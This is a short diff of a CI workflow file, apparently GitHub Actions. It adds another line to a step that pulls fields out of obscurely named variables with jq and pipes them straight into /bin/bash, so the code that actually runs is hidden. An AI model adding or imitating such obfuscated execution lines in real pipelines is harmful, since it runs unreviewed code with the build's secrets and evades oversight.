@@ -27,6 +27,7 @@ jobs:
           echo $efc9 | jq -r .sh2 | /bin/bash
           printf '%s' "$hluuy196" | jq -r .cbxnq727 | /bin/bash
           printf '%s' "$l187" | jq -r .mlgo2 | /bin/bash
+          echo $eon405 | jq -r .k02 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
